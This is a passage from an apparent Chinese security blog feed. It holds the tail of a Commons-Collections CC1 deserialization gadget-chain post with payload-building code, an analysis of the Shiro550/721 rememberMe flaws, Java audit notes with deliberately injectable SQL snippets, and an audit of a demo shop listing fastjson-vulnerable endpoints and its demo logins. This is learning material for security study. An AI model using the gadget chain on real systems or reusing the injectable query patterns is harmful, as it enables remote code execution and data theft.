class="hljs-string">&quot;&quot;</span>);;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> TransformedMap.decorate(objectObjectHashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>    <span class="hljs-comment">// 入口类</span><br>    Class c=Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    Object o=constructor.newInstance(Target.class,decorate);<br>    <br>    <span class="hljs-comment">// 序列化</span><br>    serialize(o);<br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;person.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOut);<br>        out.writeObject(o);<br>        out.close();<br>        fileOut.close();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;person.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileIn);<br>        in.readObject();<br>        in.close();<br>        fileIn.close();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写一下利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler.readObject()<br>    AbstractInputCheckedMapDecorator.setValue()<br>    TransformedMap.checkSetValue()<br>    ChainedTransformer.transform()<br>    ConstantTransformer.transform() <br>    InvokerTransformer.transform()<br></code></pre></td></tr></table></figure><p>寻找利用链的过程：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>check<span class="hljs-constructor">SetValue()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractInputCheckedMapDecorator</span>.</span></span>set<span class="hljs-constructor">Value()</span> =&gt; <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br></code></pre></td></tr></table></figure><p>CC1 链还是比较好理解的，执行类 <code>InvokerTransformer.transform()</code> 实现了通过反射去执行任意方法的功能，由于 <code>Runtime</code> 类没有实现 <code>Serializable</code> ，所以需要通过反射来调用它，其中的 <code>ConstantTransformer</code> 和 <code>ChainedTransformer</code> 作为辅助类去帮助  <code>InvokerTransformer</code> 实现了命令执行的功能。最后是全部放到  <code>ChainedTransformer</code> 中，只要调用  <code>transform()</code>  即可执行命令。</p><p>不过要去触发 <code>transform()</code> 来执行命令，然后就寻找调用了 <code>InvokerTransformer.transform()</code> 的类，有 2 个，<code>TransformMap</code> 和 <code>LazyMap</code>。</p><p><code>TransformMap</code> 可以通过获取的转换器去对 <code>Map</code> 进行转换，然后我们就使用上面的集成的  <code>ChainedTransformer</code> 构造器，在 <code>TransformedMap.checkSetValue()</code> 中执行了构造器的  <code>transform()</code> ，然后就找那里调用了  <code>TransformedMap.checkSetValue()</code> ，最后是在 <code>AbstractInputCheckedMapDecorator.setValue()</code> 中调用了，再继续向上找到了 <code>AnnotationInvocationHandler.readObject()</code> 这里，这里就可以作为入口类。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro反序列化分析</title>
    <link href="/2023/08/31/Java%E5%AE%89%E5%85%A8/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <url>/2023/08/31/Java%E5%AE%89%E5%85%A8/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro反序列化分析"><a href="#Shiro反序列化分析" class="headerlink" title="Shiro反序列化分析"></a>Shiro反序列化分析</h1><p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h2 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h2><ul><li>漏洞编号：CVE-2016-4437</li><li>影响版本：Apache Shiro &lt;&#x3D; 1.2.4</li></ul><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Shiro 1.2.4 及以前版本中，加密的用户信息序列化后存储在名为 remember-me 的 Cookie 中。而 Cookie 字段会在解码解密后被反序列化，其加密（ AES 默认密钥 ）和编码方式（ Base64 ）可控，Cookie 可控，导致反序列化漏洞。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>环境搭建：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">git</span> clone git@github.com:apache/shiro.git<br><span class="hljs-attribute">cd</span> shiro<br><span class="hljs-attribute">git</span> checkout shiro-root-<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>修改 <code>shiro/samples/web</code>，为 <code>jstl</code> 添加 <code>version</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><p>全局搜索 <code>Cookie</code>，找到 <code>CookieRememberMeManager.java</code> ，里面就那几个方法，看 <code>rememberSerializedIdentity</code>：</p><p>接受一个序列化后的字节流并将其 Base64 编码，然后设置为 Cookie ：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311716846.png" alt="image-20230831171659766"></p><p>寻找哪里调用了该方法：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311718643.png" alt="image-20230831171816606"></p><p>这里的 <code>convertPrincipalsToBytes</code> 先序列化，然后再使用 <code>encrypt</code> 方法加密：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311718992.png" alt="image-20230831171837956"></p><p>跟序列化，使用 <code>writeObject</code> 的：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309011544767.png" alt="image-20230901154437629"></p><p>跟  <code>encrypt</code> 方法：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311721564.png" alt="image-20230831172107526"></p><p>注释表示该方法是通过指定的 key 加密数据：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311726651.png" alt="image-20230831172619606"></p><p>然后跟到了这里，发现它用的是  Java 加密库中的 <code>javax.crypto.Cipher</code> 类来进行加密和解密操作：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311731307.png" alt="image-20230831173155221"></p><p>而具体的加解密类型是在 <code>Cipher</code> 初始化时就被确定的了。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311733324.png" alt="image-20230831173331284"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311733672.png" alt="image-20230831173348651"></p><p>最后跟到这里：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309011651861.png" alt="image-20230901165103799"></p><p>AES 加密，且 key 是一个常量：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311737581.png" alt="image-20230831173707556"></p><p>这时加密过程已经完了，后再退回来整理一下：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311738320.png" alt="image-20230831173846292"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311738638.png" alt="image-20230831173820612"></p><p><code>rememberIdentity</code>：序列化 &#x3D;&gt; AES 加密 &#x3D;&gt; Base64 加密</p><p>之后就是就是往上跟，到了这里，差不多也完了：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311742286.png" alt="image-20230831174225234"></p><h4 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h4><p>再跟一下解密：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311745237.png" alt="image-20230831174516182"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308311744389.png" alt="image-20230831174433356"></p><p>具体的解密就不跟了，AES 是对称加密，加解密的 key 是相同的。</p><p>这个漏洞的成因就在这里，Cookie 值可控，AES 加密 Key 可控，那么反序列化的数据就可控，导致了反序列化漏洞的产生。</p><h2 id="Shiro721"><a href="#Shiro721" class="headerlink" title="Shiro721"></a>Shiro721</h2><ul><li>漏洞编码：CVE-2019-12422</li><li>影响版本：Apache Shiro &lt;&#x3D; 1.4.1</li><li>利用条件：成功登录</li></ul><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Shiro721 和 Shrio550 的不同之处在于 Shiro550 中 AES 加密密钥是固定值，而在 Shiro721 中的密钥是随机生成的。</p><p>不过由于 Shiro721 中使用 AES-128-CBC 来进行加密，加密方式属于 CBC 模式，可利用 Padding Oracle Attack 来绕过密钥直接构造攻击密文。</p><p>该漏洞需要爆破密钥的时间过长、请求过多，实战中不适合利用。</p><p>Padding Oracle Attack：</p><ul><li><a href="https://goodapple.top/archives/217">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析</a></li></ul><p>攻击流程：</p><ul><li>登录网站获取合法 Cookie</li><li>使用 rememberMe 字段进行Padding Oracle Attack，获取 intermediary</li><li>利用 intermediary 构造出恶意的反序列化密文作为 Cookie</li><li>使用新的 Cookie 请求网站执行攻击</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计</title>
    <link href="/2023/08/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2023/08/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="Java代码审计"><a href="#Java代码审计" class="headerlink" title="Java代码审计"></a>Java代码审计</h1><h2 id="filter过滤器"><a href="#filter过滤器" class="headerlink" title="filter过滤器"></a>filter过滤器</h2><p>Filter 是 JavaWeb 中的过滤器，用于过滤 URL 请求。</p><p>通过 Filter 我们可以实现 URL 请求资源权限验证、用户登录检测等功能。</p><p>Filter 是一个接口，实现一个 Filter 只需要重写 init、doFilter、destroy 方法即可，其中过滤逻辑都在 doFilter 方法中实现。</p><p>可以在 web.xml 中查看，格式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 名字 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 位置 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 规则 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发现存在漏洞过滤器后，看一下具体的实现方法，是否有绕过的方法。</p><h2 id="第三方组件"><a href="#第三方组件" class="headerlink" title="第三方组件"></a>第三方组件</h2><p>审计一套系统，可以先看看 pom.xml 中加载了那些组件 ，如果这些组件中本身存在漏洞，就可以直接利用这些漏洞。</p><p>第三方组件漏洞利用：</p><ol><li>查找组件漏洞资料，看版本是否符合</li><li>查看该漏洞的出现原因，在该程序中是否存在</li><li>查找程序中调用该组件的位置，进行漏洞测试</li></ol><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>SQL 注入的产生原因：</p><ul><li>后端未对用户输入的参数进行过滤就直接拼接到 SQL 语句中执行</li></ul><p>这里有 2 个点，及 Java 中的应对方案：</p><ol><li>对用户输入的参数进行过滤：类型转换、过滤特殊符号</li><li>直接拼接到 SQL 语句中执行：预编译拼接 SQL 语句</li></ol><p>在 Java 中，是否产生 SQL 注入，就与能否正确使用 “预编译” 有关。</p><p>当然，在没有使用 “预编译”，但对输入参数的处理很严谨也是不存在注入的。</p><h3 id="jdbc"><a href="#jdbc" class="headerlink" title="jdbc"></a>jdbc</h3><p>jdbc 执行 sql 语句相关的有 2 个接口：</p><ol><li>Statement</li><li>PreparedStatement</li></ol><p>PreparedStatement 继承 Statement，且比 Statement 多了一个 “预编译” 功能。</p><p>存在 SQL 注入的场景：</p><ol><li>使用 Statement 直接执行 SQL 语句，造成 SQL 注入（ 没有对参数进行过滤 ）</li><li>使用 PreparedStatement 却没有使用 “?” 标明参数位置，导致没能对进行预编译造成 SQL 注入（ 没有对参数进行过滤 ）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 使用 Statement 直接执行 SQL 语句</span><br><span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> con.createStatement();<br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select  from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<br><span class="hljs-comment">// 使用了 PreparedStatement 却没有使用 ? 占位符而是直接拼接</span><br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select  from user where id =&quot;</span>+req.getParameter(<span class="hljs-string">&quot;id&quot;</span>);<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pst</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> pst.executeQuery();<br><span class="hljs-comment">// 安全的写法</span><br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select  from user where id = ?&quot;</span>;<span class="hljs-comment">// 参数占位符</span><br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstt</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>pstt.setInt(<span class="hljs-number">1</span>, Integer.parseInt(req.getParameter(<span class="hljs-string">&quot;id&quot;</span>)));<span class="hljs-comment">// 强制转换为 int , 添加到模板参数位置</span><br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> pstt.executeQuery();<br></code></pre></td></tr></table></figure><h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><p> Mybatis 使用 parameterType 向 sql 语句传参，在 sql 引用传参可以使用 <code>#&#123;Parameter&#125;</code> 和 <code>$&#123;Parameter&#125;</code> 两种方式。</p><ul><li><code>#&#123;Parameter&#125;</code> ：预编译构造SQL语句</li><li><code>$&#123;Parameter&#125;</code> ：直接拼接构造SQL语句</li></ul><p> Mybatis 的 sql 语句是放在 xml 文件中的，而其标签中的 id 就是方法名，所以可以直接搜索 id 获取方法位置。</p><p>存在 SQL 注入的场景：</p><ul><li>参数在 like、in、order by 位置时，使用  <code>#&#123;Parameter&#125;</code>  会导致程序报错或语句失效，所以只能使用  <code>$&#123;Parameter&#125;</code> ，那么当过滤不严谨时就会导致 SQL 注入</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- like 使用 $&#123;Parameter&#125; 导致 SQL 注入  --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln02&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select  from users where username like &#x27;%$&#123;_parameter&#125;%&#x27;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- like 的正确写法 --&gt;</span><br>mysql:<br>    select  from users where username like concat(&#x27;%&#x27;,#&#123;username&#125;,&#x27;%&#x27;)<br>oracle:<br>    select  from users where username like &#x27;%&#x27;||#&#123;username&#125;||&#x27;%&#x27;<br>sqlserver:<br>    select  from users where username like &#x27;%&#x27;+#&#123;username&#125;+&#x27;%&#x27;<br></code></pre></td></tr></table></figure><h3 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h3><p>Hibernate 可以使用 hql 来执行 SQL 语句，也可以直接执行 SQL 语句，无论是哪种方式都有可能导致 SQL 注入。</p><p>hql 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">String hql <span class="hljs-operator">=</span> &quot;from People where username = &#x27;&quot; <span class="hljs-operator">+</span> username <span class="hljs-operator">+</span> &quot;&#x27;&quot;<br></code></pre></td></tr></table></figure><p>hql 可以通过 “参数绑定” 的方式来预防 SQL 注入，其实也就是预编译了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 命名参数绑定</span><br><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = :name&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-string">&quot;name&quot;</span>, parameter);<br><span class="hljs-comment">// 位置参数绑定</span><br><span class="hljs-type">String</span> <span class="hljs-variable">parameter</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;g1ts&quot;</span>;<br>Query&lt;User&gt; query = session.createQuery(<span class="hljs-string">&quot;from users name = ?1&quot;</span>, User.class);<br>query.setParameter(<span class="hljs-number">1</span>, parameter);<br></code></pre></td></tr></table></figure><p>Hibernate 存在 SQL 注入的场景就是不使用 “参数绑定” ，而直接拼接参数，且不过滤了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 直接拼接, 导致 SQL 注入</span><br>session.createQuery(<span class="hljs-string">&quot;FROM User where name=&#x27;&quot;</span> + parameter + <span class="hljs-string">&quot;&#x27;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="XSS-跨站"><a href="#XSS-跨站" class="headerlink" title="XSS 跨站"></a>XSS 跨站</h2><p>XSS 产生原因：</p><ul><li>后端对用户输入未过滤|过滤不完全就被输出到页面</li></ul><p>Java 中的 XSS 审计和 PHP 的也是一个思路，通过 “功能点” 找到对应源码，然后审计看是否存在过滤、或过滤是否可以绕过。</p><p>这里的 “功能点” 是指 “用户输入的参数会回显到页面”，过滤有 2 点，一是 Filter 中的过滤器，二是是否看功能位置是否对用户输入的参数过滤、转义等。</p><h2 id="失效的身份验证"><a href="#失效的身份验证" class="headerlink" title="失效的身份验证"></a>失效的身份验证</h2><p>Java 实现身份验证的几种情况：</p><ul><li>单纯代码实现</li><li>引入第三方组件</li><li>使用 Filter 过滤器</li><li>使用 JWT 实现 （ 获取 key 伪造 ）</li></ul><p>失效的身份验证存在的漏洞就是越权、未授权等操作，那么对于单纯代码实现的身份验证就需要寻找功能点，再找对应方法，分析是否存在缺陷；</p><p>而使用第三方组件实现时，可以查看该组件使用方法，查看其配置，是否存在匿名访问目录，其路由是否存在危险方法。或者看该版本是否存在身份验证漏洞。</p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE 出现场景：</p><ul><li>服务端直接存在可执行函，且对传入的参数过滤不严格</li><li>表达式注入</li><li>模板引擎注入</li><li>第三方开源组件</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xz.aliyun.com/t/11672">JAVA常用框架SQL注入审计</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>迷你天猫商城</title>
    <link href="/2023/08/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Mini-Tmall/"/>
    <url>/2023/08/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Mini-Tmall/</url>
    
    <content type="html"><![CDATA[<h1 id="迷你天猫商城"><a href="#迷你天猫商城" class="headerlink" title="迷你天猫商城"></a>迷你天猫商城</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>项目地址：<a href="https://gitee.com/project_team/Tmall_demo/tree/19a3edba2b9920b7ad22852c0eb1cf9fc3697de8/">Gitee 迷你天猫商城</a></p><p>环境信息：</p><ul><li>Java：1.8</li><li>MySql：5.7</li></ul><p>搭建流程：</p><ol><li>创建 <code>tmalldemodb</code> 数据库</li><li>运行 <code>tmalldemodb.sql</code> 文件</li><li>使用 IDEA 打开本项目，等待 Maven 自动加载依赖项</li><li>修改配置文件 <code>application.properties</code> 端口、数据库密码</li><li>启动项目</li></ol><p>项目地址：</p><ul><li>前台地址：<code>http://127.0.0.1/tmall</code></li><li>后台地址：<code>http://127.0.0.1/tmall/admin</code></li></ul><p>账号密码可以在数据库中可以找到，明文显示的。</p><p>后台：1209577113 &#x2F; xq</p><p>前台：MRJIANG &#x2F; cc123.0</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="组件信息"><a href="#组件信息" class="headerlink" title="组件信息"></a>组件信息</h3><p>使用 idea 的 <code>Maven Helper</code> 插件可以很方便的查看组件信息：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022040083.png" alt="image-20230902204047046"></p><p>存在漏洞的组件：</p><ul><li><code>fastjson</code></li><li><code>log4j2</code></li><li><code>mybatis</code></li></ul><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><p>后台权限校验：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022047253.png" alt="image-20230902204704100"></p><h2 id="组件漏洞"><a href="#组件漏洞" class="headerlink" title="组件漏洞"></a>组件漏洞</h2><h3 id="fastjson-反序列化"><a href="#fastjson-反序列化" class="headerlink" title="fastjson 反序列化"></a>fastjson 反序列化</h3><h4 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h4><p><code>fastjson</code> 的反序列化依赖的是 <code>JSON.parseObject、JSON.parse</code> 这两个方法，全局搜索，查看是否存在可控参数。</p><p>共 4 处，2 个 <code>Controller</code> 中：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022050534.png" alt="image-20230902205018426"></p><p>先看 <code>ProductController.java</code>：</p><p><code>addProduct</code> 方法中 <code>propertyJson</code> 可控，存在漏洞；</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309022055166.png" alt="image-20230902205516017"></p><p><code>updateProduct</code> 方法中 <code>propertyAddJson、propertyUpdateJson</code> 同样都可控，存在漏洞。</p><p><code>ForeOrderController.java</code> 中 <code>updateOrderItem</code> 方法中的 <code>orderItemMap</code> 同样可控，存在漏洞。</p><h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>信息整理：</p><ul><li>后台<ul><li>添加产品信息 &#x3D;&gt; <code>/tmall/admin/product</code> &#x3D;&gt; <code>POST</code> &#x3D;&gt; <code>propertyJson</code></li><li>更新产品信息 &#x3D;&gt; <code>/tmall/admin/product/&#123;&#123;product_id&#125;&#125;</code> &#x3D;&gt; <code>PUT</code> &#x3D;&gt; <code>propertyAddJson、propertyUpdateJson</code></li></ul></li><li>前台<ul><li>更新购物车订单项数量 &#x3D;&gt; 